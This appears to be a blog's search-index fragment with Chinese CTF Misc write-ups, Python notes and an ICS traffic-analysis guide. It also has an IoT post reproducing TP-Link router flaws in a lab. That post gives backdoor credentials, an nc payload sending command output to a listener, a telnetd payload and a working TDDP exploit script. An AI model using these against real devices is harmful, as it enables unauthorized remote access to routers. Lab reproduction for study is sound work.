\"hncimfjkekedgcnhncio\" 然后就是有点脑洞，就是根据把j和k后面的字符ASCII分别-2和+14 j后面的字符直接-2是可以肉眼观察出来的，但是k后面的字符+14可以通过爆破 str1 = \"jjjjkkjjkjkkjjjjjjjk\" str2 = \"hncimfjkekedgcnhncio\" res = [] for key in range(-100,100): flag = \"\" for i in range(len(str1)): if str1[i] == \"j\": flag += chr(ord(str2[i]) - 2) else: flag += chr(ord(str2[i]) + key) print(f\"flag:{flag.encode()} key:{key}\") # flag:b'flag{thisisrealflag}' key:14 然后就可以得到最后的flag：flag{thisisrealflag} 题目名称 蓝书包 解压附件压缩包，得到128个压缩包，然后每个压缩包里只有一个文件 尝试使用工具弱密码爆破压缩包，发现第一个压缩包的密码是10001，第二个是10002，以此类推 解压第一个压缩包发现有PNG的文件头，因此猜测把所有压缩包中的数据连起来是一张PNG图片 编写以下脚本提取一下数据然后保存为图片 import zipfile import os def decompress_zip(archive_file,passwd): if not os.path.exists(\"tmp\"): os.mkdir(\"tmp\") with zipfile.ZipFile(archive_file, 'r') as zip_ref: zip_ref.extractall(path=\"tmp/\", pwd=passwd.encode()) print(f\"{archive_file}用{passwd}成功解压缩 ===\u003e\") def extract_data(): files = os.listdir(\"./tmp\") # print(files) for file in files: filepath = \"./tmp/\"+file with open(filepath,'rb') as f: data = f.read() os.system(\"rm tmp/*\") return data if __name__ == \"__main__\": png_data = b'' for i in range(1,183): filename = f\"{i}.zip\" passwd = str(10000+i) decompress_zip(filename,passwd) png_data += extract_data() # print(png_data) with open(\"flag.png\",\"wb\") as f: f.write(png_data) 运行以上脚本后可以得到下面这张图片 最后使用B神的PuzzleSolver爆破cloacked-pixel即可得到flag：flag{8719e663c0507cecbff2db103a7f7cd7} 题目名称 jpg 感觉这道题的整体出题思路参考自：2023 铁三决赛-baby-jpg 解压附件压缩包，可以得到一张att.jpg图片，010打开发现末尾藏了一个压缩包 用010手动把压缩包提取出来，压缩包中有以下几个文件 尝试去除压缩包的伪加密，发现只有flag.pdf是伪加密 然后结合flag.txt的store压缩方法，猜测需要明文攻击 用exiftool查看一下flag.pdf的元数据，发现有WPS和PS相关字样 尝试使用WPS打开这个PDF，没有发现有用的信息，但是当我们用PS打开这个PDF 发现有好几个图层，然后其中一个图层有一张二维码 直接扫码可能会扫不出来，我们可以导出为PNG，然后颜色反转一下再扫码 扫码后可以得到如下内容 67f480eff11781617044bd47fb9535cfb0e4b6a09e51daff2107c536e9d4eebb3d517cfea6e3f176d4e0d37a9f3658845f3d1917cfce30a4f44ffa2e0af58485 把以上内容保存到sha512.txt中 经过尝试，发现用7z的标准压缩方法，把文件压缩为sha512.zip后可以正常进行明文攻击 最后使用密码123解压压缩包即可得到flag：flag{10e23151aa0da35221a81dff81a53b4e} 题目名称 one 题目附件给了一个cnc.txt，内容是10000行每行114个字符的十六进制数据 部分内容如下： dd1bbd60cff3095f188b70af36a4ea2644f5241a425469a3b2b7c92fabd639ad55dfc8dd4393e4c572af31dbc4dab5173cc0bcb768331fb51d a3f4057ce7fee14d7a79a28f9b51fb0e64063e41e09a0102b9024ed8da62c79a7e02155b23e9f2f66d8962260a04a6a92a4336aca932cc7431 be509b0be9e225cf2d639bbfb6e9595eb8111deb74b2b236265359a0bf5f2cdae1825a9072ce751f9fa40ea1bef650b5137506282ee02674c7 e8041edfc9dd08a5e74e4c4abe8c9dbca089572974798180fd5c11a15dad2a10968803c191592084600ce534cd9361194010759e97d30dfa15 9ab9a7966725e87fe0c92b4fdc95e7ae833aa180db6f295340cbcf294c7d08834e91dfdfafa98c7cc03404dbdf502bdc2e7e4c046ebd62fb23 c8725bb8060e13fead44e9a5ffb6f331383a717e9ec8498112a33ca8940a75947a8b191c68ac68e8459f7a6eb5737413a6484ff0b91004ec1a cc385111badde9d78f2f5aee756eb34a09b86a4284a18902eee1bbbfadf1915bf8d19a03a7dc6b9bad117530dc505a76e6d5fc9f3897e89034 b318450ba8c7c8cd618ea3c4d396a2e99c3d99fe150218f2ff484003ed13e205ebe61b6108970ff530635f8fbc57e61e476618b3566de76ef2 95cda1e94b9d59843069fb8f2c4415404f31be077ebc1f83a61f08cd62d75e3d6379ca0b69e375372fd0f206d1009ebf397683c927da0ab63d bc3cf1722bf8f617acc85ba7169649ecd70c7e9575c05ef04cde5bd8eb79120a756e1a7755acb17da63fe76286759b68f646178c8a01fac142 ","date":"2024-12-01","objectID":"/posts/1618f6c/:0:0","tags":["CTF","Misc","Writeup"],"title":"2024 古剑山全国大学生网络攻防大赛 Misc Writeup","uri":"/posts/1618f6c/"},{"categories":["Language"],"content":"Basic knowledge of Python Language. 字符串处理 ljust和rjust str.ljust(width, fillchar): 这个方法返回一个左对齐的版本的原字符串，并使用 fillchar 填充至少 width 长度的字符。 如果原字符串的长度超过了 width，则返回原字符串。 str.rjust(width, fillchar): 与 ljust 相似，但是它返回一个右对齐的版本 res = \"1101\" ## 使用 rjust 在 res 的前面补零直到其长度是 8 的倍数 ## ((len(res) + 7) // 8) * 8: 得到下一个8的倍数 required_length = ((len(res) + 7) // 8) * 8 res = res.rjust(required_length, '0') print(res) ## 输出: 00001101 format_string Python字符串前u、r、b、f的含义 字符串前加u——表示unicode字符串 可能是因为这段字符串中含有中文 字符串前加r——表示非转义的原始字符串 去掉反斜杠的转义机制 字符串前加b——表示这是一个bytes类型的对象 python2默认字符编码是ASCII python3默认的字符编码是Unicode 在python3中bytes和str的互相转换方式是： str.encode('utf-8') bytes.decode('utf-8') 字符串前加f——表示在字符串内支持大括号包裹的Python表达式 name = \"Li\" age = 16 ## print(\"Hello \" + name + \" you are \" + str(age) + \" years old\") print(\"Hello %s ,you are %d years old\" % (name, age)) print('%.3f' % 3.14159) your_name = input(\"please input your name:\\n\") print(f\"Hello,{your_name}\") print(f\"Hello,{your_name}\") print(\"Hello\", your_name) print(\"Hello\" + your_name) ''' Hello,Tom Hello,Tom Hello Tom HelloTom ''' b = 1 a = 1.05555 ## 第一种方式 print(f'b 的值为:{b}') ## float 类型输出 print(f'a 的值为:{a:f}') ## float 保留两位小数 五舍六入 print(f'a 的值为:{a:.4f}') ## 第二种方式 print('a 的值为:'+str(a)) ## 第三种方式 print('a 的值为:{}'.format(a)) 匿名函数Lambda def add_lambda(a, b=1): return a+b print(add_lambda(10, 20)) print(add_lambda(10)) #三项表达式 get_odd_even = lambda x:'even' if x%2==0 else 'odd' print(get_odd_even(8)) print(get_odd_even(9)) #无参数表达式 import random ran_lambda = lambda:random.random() print(ran_lambda) #map函数，将列表中的元素作为参数传入指定函数 mobj = map(lambda x:x**2,[1,2,3,4]) print(list(mobj)) enumerate关键字的使用 在Python中，enumerate()是一个内建函数，它允许你在遍历一个序列（例如列表、字符串或元组）的同时，追踪当前元素的索引 基本用法如下： for i, value in enumerate(some_list): print(f\"At index {i}, the value is {value}\") open函数打开文件的模式 open()函数完整的语法格式为： open(file, mode=‘r’, buffering=None, encoding=None, errors=None, newline=None, closefd=True) 文件格式相关参数 t：以文本格式打开文件（默认）。一般用于文本文件，如：txt。 b：以二进制格式打开文件。一般用于非文本文件，如：图片。 读写模式相关参数 r：以只读方式打开文件（默认模式）。文件指针定位在文件头的位置。如果文件不存在会报错。 w：以只写方式打开文件。如果文件存在，则打开文件，清空文件内容，从文件头开始编辑；如果文件不存在，则创建新文件，打开编辑。 a：以追加方式打开文件，同样是只写，不允许进行读操作。如果文件存在，则打开文件，将文件指针定位到文件尾。因此，新的内容是追加在已有内容之后。如果文件不存在，则创建新文件进行写入。 +：打开一个文件进行更新（可读写）。注意：该模式不能单独使用，需要与r/w/a组合使用。打开文件后文件指针的位置取决于另一个组合参数。 组合模式 r+：打开一个文件用于读写。如果文件存在，则打开文件，将文件指针定位在文件头，新写入的内容在原有内容的前面；如果文件不存在会报错。 w+：打开一个文件用于读写。如果文件存在，则打开文件，清空原有内容，进入编辑模式；如果文件不存在，则创建一个新文件进行读写操作。 a+：以追加模式打开一个文件用于读写。如果文件存在，则打开文件，将文件指针定位在文件尾，新写入的内容在原有内容的后面；如果文件不存在，则创建一个新文件用于读写。 所有上面这些模式默认都是t——文本模式，如果要以二进制模式打开，需要加上参数b，如：rb、rb+、wb、wb+、ab、ab+。 try语句的使用 ## -*- encoding: utf-8 -*- ''' @File : try.py @Time : 2022/11/14 15:27:12 @Author : Lunatic @Version : 1.0 @Contact : goodlunatic0@gmail.com ''' import os import traceback ## try: ## \u003cstatements\u003e #运行try语句块，并试图捕获异常 ## except \u003cname1\u003e: ## \u003cstatements\u003e #如果name1异常发现，那么执行该语句块。 ## except (name2, name3): ## \u003cstatements\u003e #如果元组内的任意异常发生，那么捕获它 ## except \u003cname4\u003e as \u003cvariable\u003e: ## \u003cstatements\u003e #如果name4异常发生，那么进入该语句块，并把异常实例命名为variable ## except: ## \u003cstatements\u003e #发生了以上所有列出的异常之外的异常 ## else: ## \u003cstatements\u003e #如果没有异常发生，那么执行该语句块 ## finally: ## \u003cstatement\u003e #无论是否有异常发生，均会执行该语句块。 ## try: ## num = int(input('请输入一个整数:')) ## result = 8 / num ## print(result) ## ## except ZeroDivisionError: ## ## print('0不能做除数') ## except ValueError as r: ## ## r 是前面 ValueError 类的一个实例,下面是打印报错的明细 ## print('输入的值不是合法的整数 %s' % (r)) ## except Exception as r: ## print('未知错误 %s' % (r)) ## ## 没有预先判断到的错误怎么办? ## finally: ## ## 无论是否有异常，都会执行的代码 ## print('%%%%%%%%%%%%%%%') ## def demo1(): ## return int(input('请输入整数:')) ## def demo2(): ## return demo1() ## ## 函数的错误：一级一级的去找，最终会将异常传递到主函数里 ## try: ## print(demo2()) ## except Exception as r: ## print('未知错误 %s' % r) ## print(demo2()) ## def input_passwd(): ## ## 1.提示用户输入密码 ## pwd = input('请输入密码：') ## ## 2.判断密码的长度 ## if len(pwd) \u003e= 8: ## return pwd ## ## 3.如果\u003c8就主动抛出异常 ## print('主动抛出异常') ## #a.创建异常对象 ## ex = Exception('长度不够') ## #b.主动抛出 ## raise ex ## ## 注意：只抛出异常而不捕获异常 代码会出错 ## try: ## print(input_passwd()) ## except Exception as re: ## print(re) #---------","date":"2024-11-05","objectID":"/posts/e19da63/:0:0","tags":["Language"],"title":"Python Basic Knowledge","uri":"/posts/e19da63/"},{"categories":["Writeup"],"content":"不知道具体是什么比赛，但是赛题还是有一定的强度的 本文中涉及的具体题目附件可以进我的知识星球获取 题目名称 X0r X0r is just a commonly used simple encryption 题目附件给了一个 enc.txt，内容如下： ys~xdg/m@]mjkz@vl@z~lf\u003eb 直接拉进CyberChef用 XOR Brute Force 一把梭就行 flag{x0r_Brute_is_easy!} 题目名称 一只小猫 / add 解压附件压缩包，得到以下两张图片 根据第二章图片的名字noflag提示了flag可能不在这张图片里，因此我们把注意力集中到第一张图片上 用stegsolve打开add.png，发现有好几个通道存在LSB隐写的痕迹，然后观察到不同的通道背景不同 我们在stegsolve中使用 data extract 把黑色背景并且带有LSB隐写的通道勾选上即可得到flag flag{24aa07d8-8662-718a-9da8-a2628e779e40} 其实这里也算是非预期了吧，预期解应该是根据图片的文件名add想到使用 Image Conbiner 把两张图片和一起 合成后导出为bmp，然后再用zsteg扫描得到flag 题目名称 Finder 解压附件压缩包，得到如下几个文件 readme.txt中的内容如下 某大型企业为了保护其内部数据安全，已经实施了严格的访问控制措施，并且在每位员工的电脑上安装了数字水印软件。这个软件会在员工处理的所有文档中嵌入一个独特的标识符，该标识符由员工的名字和手机号码后四位组成，用以追踪任何可能的数据泄露事件。 最近，这家企业发现了一些包含敏感信息的文件被非法传播到了外部。基于此情况，怀疑是某些内部员工违反规定将这些文档外泄。为了解决这个问题并找出责任人，企业现在提供了一个用于生成这些数字水印的具体算法。 接下来，请你协助该企业安全部门提取文档中嵌入的员工信息，任务如下： 1. 对泄漏的三个文档进行分析，提取出每个文档中嵌入的员工信息。 2. 找出所有泄漏文档中的员工信息，请将这些信息按首字母顺序依次排列，形如“Albert1234_Bili5678”的字符串。 3. 对改字符串进行MD5计算，并将生成的32位小写MD5值包裹上flag{}提交至平台即可。 A large enterprise has implemented strict access control measures to protect its internal data security and has installed digital watermarking software on every employee's computer. This software embeds a unique identifier in all documents processed by employees, consisting of the employee's name and the last four digits of their mobile phone number, to track any potential data leakage incidents. Recently, the enterprise discovered that some files containing sensitive information had been illegally disseminated externally. Based on this situation, there are suspicions that some internal employees violated regulations and leaked these documents. To address this issue and identify the responsible parties, the enterprise is now providing a specific algorithm to generate these digital watermarks. Next, please assist the enterprise's security department in extracting the embedded employee information from the documents. The tasks are as follows: 1. Analyze the three leaked documents to extract the embedded employee information from each document. 2. Identify all employee information from the leaked documents and arrange this information in alphabetical order, formatted as strings like “Albert1234_Bili5678” 3. Perform an MD5 hash calculation on the resulting string and submit the generated 32-character lowercase MD5 value wrapped in flag{} to the platform. 所以题目的意思大概就是让我们提取嵌在三个xlsx文件中的水印 Excel_enc.py 中的内容如下 # -*- coding: utf-8 -*- import random class MagicText: def __init__ (O0O00OO00O0OO0OOO ,OO0O00OOO00OOOO00 ,chr_type =(4 ,5 )): O0O00OO00O0OO0OOO .bit2char_dict =O0O00OO00O0OO0OOO ._create_char_dict (chr_type ) O0O00OO00O0OO0OOO .char2bit_dict ={O0O0OO00000O0OOOO :O0OOOO0O0O00OO00O for O0OOOO0O0O00OO00O ,O0O0OO00000O0OOOO in O0O00OO00O0OO0OOO .bit2char_dict .items ()} O0O00OO00O0OO0OOO .password =OO0O00OOO00OOOO00 def _create_char_dict (OO00OO00OO0OO0O00 ,OOOOOO0O000O000O0 ): OOOOOO000O0O0OO00 =('200D','FEFF','200B','1d','200C','7F') OO00OO0O0O0O00O00 =[chr (int (OOOOOO000O0O0OO00 [O0O0000O0O0000O00 ],16 ))for O0O0000O0O0000O00 in OOOOOO0O000O000O0 ] return {'0':OO00OO0O0O0O00O00 [0 ],'1':OO00OO0O0O0O00O00 [1 ]} def _generate_secret_bin (O0OOO00OO0O0O0OOO ,OOOOOOO0000O00000 ): random .seed (O0OOO00OO0O0O0OOO .password ) return ''.join (format (O0OOOO0OOOOOOOO0O ^random .randint (0 ,255 ),'08b')for O0OOOO0OOOOOOOO0O in OOOOOOO0000O00000 .encode ('utf-8')) def extract_secret (OOOO000OO00OOO000 ,O000O0OOO00OOOOOO ): O0000OO0O00O0O00O =OOOO000OO00OOO000 ._generate_secret_bin (O000O0OOO00OOOOOO ) return ''.join (OOOO000OO00OOO000 .bit2char_dict [O0O00O00O00OO0O00 ]for O0O00O00O00OO0O00 in O0000OO0O00O0O00O ) def add_secret (O000O00O0O0O00O0O ,OOOOOOOO000000O00 ,O00OO0O0OO0OO0OO0 ,idx =None ): OOOOOOOO000000O00 =O000O00O0O0O00O0O .remove_secret (OOOOOOOO000000O00 ) O0000O00OO0OO0OO0 =O000O00O0O0O00O0O .extract_secret (O00OO0O0OO0OO0OO0 ) idx =idx if idx is not None else random .randint (0 ,len (OOOOOOOO000000O00 )) return OOOOOOOO000000O00 [:idx ]+O0000O00OO0OO0OO0 +OOOOOOOO","date":"2024-11-05","objectID":"/posts/69280be/:0:0","tags":["CTF","Misc","Writeup"],"title":"2024 某金融系统内部赛 Misc Writeup","uri":"/posts/69280be/"},{"categories":["CTF"],"content":"越来越多的比赛中出现工控相关的赛题，因此打算借这个机会学习一下。 工控协议分析 工控流量分析 参考连接：https://blog.csdn.net/song123sh/article/details/128387982 将流量按长度降序排列，然后在各层寻找线索， 显示分组字节，从base64后开始，然后解码看文件类型，最后显示成该类型 Modbus 协议分析 Modbus 流量主要有三类：Modbus/RTU、Modbus/ASCII、Modbus/TCP Modbus/RTU 从机地址1B+功能码1B+数据字段xB+CRC值2B 最大长度256B，所以数据字段最大长度252B Modbus/ASCII 由Modbus/RTU衍生，采用0123456789ABCDEF 表示原本的从机地址、功能码、数据字段，并添加开始结束标记，所以长度翻倍 开始标记:（0x3A）1B+从机地址2B+功能码2B+数据字段xB+LRC值2B+结束标记\\r\\n2B 最大长度513B，因为数据字段在RTU中是最大252B，所以在ASCII中最大504B Modbus/TCP 不再需要从机地址，改用UnitID；不再需要CRC/LRC，因为TCP自带校验 传输标识符2B+协议标识符2B+长度2B+从机ID 1B+功能码1B+数据字段xB 一般题目考察 Modbus/TCP 比较多，然后主要考察的就是下面这种功能码（这里只列了部分） 因此解题的时候配合过滤器一个个功能码看过去就行 1：读线圈 2：读离散输入 3：读保持 4：读输入 5：写单个线圈 6：写单个保持 15：写多个线圈 16：写多个保持 如果题目考察的是查找异常流量，那么我们只要依次查看每个 func_code，然后根据字段排除正常流量 因为大部分的流量都是正常，异常的流量肯定是小部分 例如 先查看 (modbus) \u0026\u0026 (modbus.func_code == 17)，发现有很多 modbus.data == 06:00:00 的流量 因此过滤 modbus.data == 06:00:00 的流量：((modbus) \u0026\u0026 (modbus.func_code == 17)) \u0026\u0026 !(modbus.data == 06:00:00) 就是依次过滤正常流量，最后剩下来的就是异常流量了 例题1 HNGK-Modbus流量分析 使用下面这个过滤器命令即可得到 flag (((_ws.col.protocol == \"Modbus/TCP\") ) \u0026\u0026 (modbus.byte_cnt)) \u0026\u0026 (modbus.func_code == 16) flag{TheModbusProtocolIsFunny!} 例题1 HNGK-Modbus协议分析 题目附件给了一个流量包，稍微翻一下，发现 modbus.func_code 只有四种情况：2、3、4、16 2和16的情况中没有发现什么异常，但是3和4的流量包中寄存器的值存在异常 modbus.func_code == 3 的情况中寄存器的值一直在增加，直到变成下图中的内容 而 modbus.func_code == 4 的情况则是一直在读寄存器的内容，寄存器中的内容和上面是一样的 因此猜测题目逻辑大概就是，3先写入寄存器的值，然后由4读取并发送 接下来我们就重点分析这段数据的内容，因为有不可见字符，所以我们复制为 Hex 格式 (((modbus) \u0026\u0026 (modbus.func_code == 3)) \u0026\u0026 (ip.src == 192.168.161.2)) \u0026\u0026 (modbus.byte_cnt) S7comm 协议分析 西门子设备的工控协议，基于 COTP 实现，是COTP的上层协议 主要有三种类型：Job(1)、Ack_Data(3)/Ack(2)、Userdata(7) Job：下发任务/指令 Ack_Data：带有返回数据 Ack：单纯确认，含有数据 Userdata：用户自定义数据区，也包含功能指令 例题1 2020ICSC湖州站—工控协议数据分析 首先过滤出S7协议的数据包，发现在一些Ack_Data的数据包中传输了二进制数据 因此，我们将所有带有二进制数据的数据包都过滤出来，发现一些Job的数据包中也有二进制数据 然后我们尝试将所有带有二进制数据的Job数据包都过滤出来并导出特定分组，过滤器代码如下 ((s7comm) \u0026\u0026 (s7comm.resp.data)) \u0026\u0026 (s7comm.param.func == 0x05) 然后使用 tshark 提取数据 tshark -r 1.pcap -T fields -e s7comm.resp.data | uniq 最后 CyberChef 解码二进制即可得到 flag 例题2 2020ICSC济南站—被篡改的数据 翻看流量包，发现很多 S7COMM 数据包，使用过滤器过滤，发现 s7comm.resp.data 字段传了很多 66 数据 使用过滤器过滤出传了 s7comm.resp.data 字段数据但数据不是 66 的 S7 数据包 发现了疑似 flag 的数据，为了防止 flag 中含有 f 字符而被过滤 因此我们使用下面这个过滤命令进行过滤，然后导出特定分组 (((frame.number \u003e= 19987 \u0026\u0026 frame.number \u003c=20032) \u0026\u0026 (_ws.col.protocol == \"S7COMM\")) \u0026\u0026 (s7comm.param.func == 0x05)) \u0026\u0026 (s7comm.resp.data) 最后 tshark 提取出数据，然后十六进制解码即可得到 flag：flag{93137ad4a} 例题3 枢网智盾2021—异常流分析 打开流量包，发现很多 S7comm 流量，然后稍微过滤一下，发现是写入数据的流量 然后写入的数据几乎都是 ffff 开头的，因此我们直接查看不是 ffff 开头的数据 ((_ws.col.protocol == \"S7COMM\") \u0026\u0026 (s7comm.param.func == 0x05)) \u0026\u0026 (s7comm.resp.data[0:2] != ff:ff) 即可得到 flag：flag{ffad28a0ce69db34751f} 例题4 枢网智盾2021—工控协议分析 (_ws.col.protocol == \"S7COMM\") \u0026\u0026 (frame.number == 418) 然后直接把明文传输的数据 base64 解码即可 flag{hncome66!} Web渗透类 逆向分析 TP-Link SR20 本地网络远程代码执行漏洞 固件下载链接：https://www.tp-link.com/us/support/download/sr20/#Firmware 选择 SR20(US)_V1_180518 下载，然后解压，直接使用 binwalk 提取固件即可 搭建 arm qemu 虚拟机环境 搭建环境前需要先获取以下三个文件，并置于统一目录中，下载链接：https://people.debian.org/~aurel32/qemu/armhf/ debian_wheezy_armhf_standard.qcow2 # qemu虚拟机的硬盘镜像文件，包含完整的 Debian Wheezy 操作系统（ARM 架构） initrd.img-3.2.0-4-vexpress # 初始 RAM 文件系统镜像，用于在内核加载时提供临时文件系统和驱动 vmlinuz-3.2.0-4-vexpress # 压缩的 Linux 内核镜像文件，控制系统硬件和资源管理 sudo tunctl -t tap0 -u `whoami` # 为了与 QEMU 虚拟机通信，添加一个虚拟网卡，如果显示已经分配给一个用户，要先用以下命令启用 # sudo ip link set tap0 up # 为添加的虚拟网卡配置 IP 地址 sudo ifconfig tap0 10.10.10.1/24 # 根据配置启动虚拟机 qemu-system-arm \\ -M vexpress-a9 \\ # 使用 ARM 虚拟平台 vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress \\ # 指定内核镜像文件 -initrd initrd.img-3.2.0-4-vexpress \\ # 指定 initrd 初始 RAM 文件系统 -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \\ # 将 debian 磁盘镜像作为 SD 卡 -append \"root=/dev/mmcblk0p2 console=ttyAMA0\" \\ # 内核启动参数：设置根分区及控制台 -net nic \\ # 启用虚拟网络接口 -net tap,ifname=tap0,script=no,downscript=no \\ # 使用 tap0 进行网络桥接 -nographic # 不启动图形界面，重定向到终端 虚拟机成功运行后，使用 root root 默认密码登录系统，然后使用以下命令配置网卡，建立与宿主机的通讯 ifconfig eth0 10.10.10.2/24 建立好通讯后，用以下命令把固件中的文件系统传入虚拟机中并解压 tar -cjpf squashfs-root.tar.bz2 squashfs-root/ python -m http.server wget http://10.10.1","date":"2024-10-25","objectID":"/posts/01ebd40/:0:0","tags":["CTF","Misc"],"title":"Misc-工控安全","uri":"/posts/01ebd40/"},{"categories":["Skills"],"content":"A simple blog for IOT Security Research. 前置知识 固件的获取 直接从厂商官网或官方服务器下载 使用BP或者UART串口进入设备的shell抓包获取下载地址 使用固件烧写器或者编程器提取ROM中的固件 固件的处理 解包 常用工具：binwalk、firmware-mod-kit、binaryanalysis-ng 解密 使用老版本未加密固件中的解密程序实现新版本加密固件的解密 逆向分析低版本固件的解密逻辑实现对新版本固件的解密 漏洞复现 TP-Link WR740 后门漏洞 首先获取固件，固件下载地址：https://github.com/dioos886/TP-LinkWR740 使用binwalk扫一下，可以直接看到Squashfs文件系统，使用-Me参数进行提取 Tips：如果这里无法提取出文件系统，可能是没有正确安装sasquatch，直接根据Github中的步骤安装即可 sasquatch下载地址：https://github.com/devttys0/sasquatch.git 解包完成后，可以使用 firmwalker 进行敏感信息扫描 firmwalker下载地址：https://github.com/craigz28/firmwalker.git 使用方法：./firmwalker.sh squashfs-root的路径 多次出现httpd的字样，因此猜测是httpd起的服务 接下来逆向分析一下/usr/bin/httpd这个文件 通过搜索passwd跟踪到以下DebugResultRpmHtm这个函数，可以得到 用户名：osteam 密码：5up 再往上可以找到另外两个函数ArtRpmHtm和CmdRpmHtm 然后我们对固件进行模拟，我这里使用的是AttifyOS3.0中的 firmware-analysis-toolkit 模拟成功后我们直接访问 192.168.1.1 即可 使用默认密码 admin admin 登录 登录成功后直接访问 192.168.1.1/userRpmNatDebugRpm26525557/linux_cmdline.html 然后输入我们之前逆向得到的用户名密码：osteam 5up 即可实现 RCE TP-Link SR20 本地网络远程代码执行漏洞 固件下载链接：https://www.tp-link.com/us/support/download/sr20/#Firmware 选择 SR20(US)_V1_180518 下载，然后解压，直接使用 binwalk 提取固件即可 搭建 arm qemu 虚拟机环境 搭建环境前需要先获取以下三个文件，并置于统一目录中，下载链接：https://people.debian.org/~aurel32/qemu/armhf/ debian_wheezy_armhf_standard.qcow2 # qemu虚拟机的硬盘镜像文件，包含完整的 Debian Wheezy 操作系统（ARM 架构） initrd.img-3.2.0-4-vexpress # 初始 RAM 文件系统镜像，用于在内核加载时提供临时文件系统和驱动 vmlinuz-3.2.0-4-vexpress # 压缩的 Linux 内核镜像文件，控制系统硬件和资源管理 sudo tunctl -t tap0 -u `whoami` # 为了与 QEMU 虚拟机通信，添加一个虚拟网卡，如果显示已经分配给一个用户，要先用以下命令启用 # sudo ip link set tap0 up # 为添加的虚拟网卡配置 IP 地址 sudo ifconfig tap0 10.10.10.1/24 # 根据配置启动虚拟机 qemu-system-arm \\ -M vexpress-a9 \\ # 使用 ARM 虚拟平台 vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress \\ # 指定内核镜像文件 -initrd initrd.img-3.2.0-4-vexpress \\ # 指定 initrd 初始 RAM 文件系统 -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \\ # 将 debian 磁盘镜像作为 SD 卡 -append \"root=/dev/mmcblk0p2 console=ttyAMA0\" \\ # 内核启动参数：设置根分区及控制台 -net nic \\ # 启用虚拟网络接口 -net tap,ifname=tap0,script=no,downscript=no \\ # 使用 tap0 进行网络桥接 -nographic # 不启动图形界面，重定向到终端 虚拟机成功运行后，使用 root root 默认密码登录系统，然后使用以下命令配置网卡，建立与宿主机的通讯 ifconfig eth0 10.10.10.2/24 建立好通讯后，用以下命令把固件中的文件系统传入虚拟机中并解压 tar -cjpf squashfs-root.tar.bz2 squashfs-root/ python -m http.server wget http://10.10.10.1:8000/squashfs-root.tar.bz2 tar -xjpf squashfs-root.tar.bz2 然后需要在宿主机中安装TFTP服务 sudo apt install atftpd 编辑 /etc/default/atftpd 文件，USE_INETD=true 改为 USE_INETD=false 修改 /srv/tftp 为 /tftpboot 修改完成后用以下命令启动并查看aftpd服务 sudo systemctl start atftp sudo systemctl status atftp # 如果出现 atftpd: can't bind port :69/udp 报错 # 需要先用以下命令停用 inetutils-inetd 服务，然后再restart sudo systemctl stop inetutils-inetd.service 下图是启动成功的界面 之后是漏洞复现的步骤 现在宿主机的/tftpboot 目录下创建下面两个文件 文件一：payload function config_test(config) os.execute(\"id | nc 10.10.10.1 1337\") end 文件二：poc.py #!/usr/bin/python3 # Copyright 2019 Google LLC. # SPDX-License-Identifier: Apache-2.0 # Create a file in your tftp directory with the following contents: # #function config_test(config) # os.execute(\"telnetd -l /bin/login.sh\") #end # # Execute script as poc.py remoteaddr filename import sys import binascii import socket port_send = 1040 port_receive = 61000 tddp_ver = \"01\" tddp_command = \"31\" tddp_req = \"01\" tddp_reply = \"00\" tddp_padding = \"%0.16X\" % 00 tddp_packet = \"\".join([tddp_ver, tddp_command, tddp_req, tddp_reply, tddp_padding]) sock_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) sock_receive.bind(('', port_receive)) # Send a request sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) packet = binascii.unhexlify(tddp_packet) argument = \"%s;arbitrary\" % sys.argv[2] packet = packet + argument.encode() sock_send.sendto(packet, (sys.argv[1], port_send)) sock_send.close() response, addr = sock_receive.recvfrom(1024) r = response.encode('hex') print(r) 然后虚拟机运行tddp，宿主机开启监听并运行poc.py即可成功复现 但是我这里虚拟机中tddp的动态链接库有点问题，暂时卡在这里了 参考链接：https://paper.seebug.org/879/ ","date":"2024-10-25","objectID":"/posts/848cf69/:0:0","tags":["Skills"],"title":"IOT Security Research","uri":"/posts/848cf69/"},{"categories":["Writeup"],"content":"很早之前和队友报的名，结果到现在才打。。 这比赛只能说是纯纯手速局。。 本文中涉及的具体题目附件可以进我的知识星球获取 题目名称 你是黑客么 题目附件给了一个加密的压缩包，经过尝试发现是弱密码：75067 解压后得到一张 1.jpg 图片 010打开，发现图片末尾有多余数据，是base64编码的一张图片 直接将base64编码的数据复制到CyberChef中解码即可得到一张二维码 然后识别二维码即可得到flag：flag{asdf%^\u0026*ghjkl} 题目名称 循环的压缩包(三血) 解压题目附件给的压缩包，得到一个未知后缀的文件，010打开查看 定位到压缩包的文件头 504B0304 ，发现是一个前面有512字节多余数据的zip压缩包 尝试手动删除数据，然后解压几个，发现是相同类型的压缩包套娃，因此写个脚本解套即可 import zipfile import os cnt = 1 while True: with open(\"tarfile\",'rb') as f: data = f.read() zip_data = data[512:] with open(\"new.zip\",'wb') as f: data = f.write(zip_data) os.mkdir(\"tmp\") archive_file = \"new.zip\" with zipfile.ZipFile(archive_file, 'r') as zip_ref: print(f\"[+] 第{cnt}层压缩包解压成功！\") cnt += 1 zip_ref.extractall(path=\"tmp/\") os.remove(\"tarfile\") os.remove(\"new.zip\") os.system(\"mv tmp/* .\") os.rmdir(\"tmp\") 猜测应该是刚好套了1000层，解压完后得到一个flag文件，打开即可得到flag flag{01af9cbb-6bf2-4ad8-8ecb-9dcbbc02bf19} 题目名称 GoodTime(二血) 唉，手慢了，以为抢到一血了，但是应该差不多是同时交的。 题目附件给了一个加密的压缩包，尝试用字典爆破，发现是弱密码：city 解压后可以得到如下几个 txt 文本文件，打开后发现都是十六进制数据 出题人这里没出好，因此这题这里有两种解法，我都简要介绍一下吧 解法一：常规解 仔细观察文件名，然后对应到键盘上的按键，可以发现如下规律： qwsz四个键包围的字符是a，fthb四个键包围的字符是g 另外几个文件也一一对应，刚好可以得到A B C D E F G 七个字符 因此我们按照顺序把txt中的数据连起来，在010中粘贴为十六进制数据 然后在第一段数据中修复压缩包的文件头 504B0304 即可得到一个压缩包 解压后可以得到一张图片，zsteg可以得到一串十六进制的数据 CyberChef解码即可得到flag：flag{2468__TUvn__qwer} 解法二：非预期 直接一个个查看txt中的数据，在qwsz.txt中发现明显的zip文件头，就是少了504B 复制到010中，并修复文件头 打开得到的压缩包，会提示文件已损坏，但是没事，我们直接把里面的图片拖出来 拖出来后可以得到损坏的图片 